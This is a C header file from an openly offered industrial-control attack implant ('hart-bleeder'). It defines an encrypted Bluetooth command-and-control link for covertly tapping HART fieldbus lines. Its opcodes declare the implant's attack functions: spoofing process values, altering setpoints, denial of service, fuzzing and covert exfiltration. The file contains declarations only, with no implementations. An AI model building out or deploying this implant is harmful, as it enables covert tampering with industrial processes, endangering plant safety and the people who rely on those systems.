/*
 * hart-bleeder — c2link.h
 * Encrypted BLE command-and-control backhaul via companion nRF52832
 * module for the HART Fieldbus Covert In-Line Attack Implant.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#ifndef HART_BLEEDER_C2LINK_H
#define HART_BLEEDER_C2LINK_H

#include <stdint.h>

/* ── BLE GATT service/characteristic UUIDs ───────────────────── */
#define C2_SVC_UUID      "a0000001-0000-1000-8000-00805f9b34fb"
#define C2_CHAR_CMD      "a0000002-0000-1000-8000-00805f9b34fb"
#define C2_CHAR_LOG       "a0000003-0000-1000-8000-00805f9b34fb"
#define C2_CHAR_STATUS   "a0000004-0000-1000-8000-00805f9b34fb"
#define C2_CHAR_AUTH      "a0000005-0000-1000-8000-00805f9b34fb"
#define C2_CHAR_FRAME     "a0000006-0000-1000-8000-00805f9b34fb"

/* ── C2 protocol opcodes ─────────────────────────────────────── */
typedef enum {
    C2_OP_STATUS      = 0x01,
    C2_OP_SCAN        = 0x02,
    C2_OP_READ_PV     = 0x03,
    C2_OP_SPOOF       = 0x04,
    C2_OP_SETPOINT    = 0x05,
    C2_OP_DOS         = 0x06,
    C2_OP_SAG         = 0x07,
    C2_OP_CAPTURE     = 0x08,
    C2_OP_FUZZ        = 0x09,
    C2_OP_COVERT_EX   = 0x0A,
    C2_OP_COVERT_RX   = 0x0B,
    C2_OP_MODE        = 0x0C,
    C2_OP_PASSIVE     = 0x0D,
    C2_OP_AUTH        = 0x10,
    C2_OP_LOG_NOTIFY  = 0x20,
} c2_op_t;

/* ── API ──────────────────────────────────────────────────────── */
int  c2_init(void);
int  c2_set_psk(const uint8_t *psk, uint8_t len);
int  c2_authenticate(const uint8_t *challenge, uint8_t *response);
int  c2_send_status(uint8_t state, uint8_t battery, uint8_t n_dev);
int  c2_send_log(const char *text, uint16_t len);
int  c2_send_frame(const void *frame, uint16_t len);
int  c2_process(void);   /* poll UART4 for commands, dispatch */
void c2_task(void);

/* ── Encryption (XTEA-128 CBC, software) ─────────────────────── */
void xtea_encrypt_block(uint32_t *v, const uint32_t *k);
void xtea_decrypt_block(uint32_t *v, const uint32_t *k);
int  c2_encrypt(uint8_t *out, const uint8_t *in, uint16_t len);
int  c2_decrypt(uint8_t *out, const uint8_t *in, uint16_t len);

#endif /* HART_BLEEDER_C2LINK_H */